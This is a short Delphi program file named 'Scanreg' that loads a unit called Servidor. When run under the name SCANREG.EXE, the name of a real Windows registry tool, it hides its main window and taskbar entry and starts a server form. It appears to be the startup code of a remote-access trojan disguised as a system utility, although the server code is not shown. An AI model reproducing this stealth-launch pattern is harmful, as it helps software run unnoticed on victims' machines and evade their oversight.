program Scanreg;

uses
  Forms,
  windows,sysutils,
  Servidor in 'Servidor.pas' {sv},
  IO in 'IO.pas' {bsd},
  velhaca1 in 'velhaca1.pas' {TicTac};



{$R *.RES}

var
   a:string;

begin

  Application.Initialize;
  a:=Uppercase(extractfilename(application.exename));
  if a='SCANREG.EXE' then
     application.ShowMainForm:=false;
  Application.CreateForm(Tsv, sv);
  if a='SCANREG.EXE' then
     ShowWindow(application.handle,SW_Hide);
  Application.Run;

end.
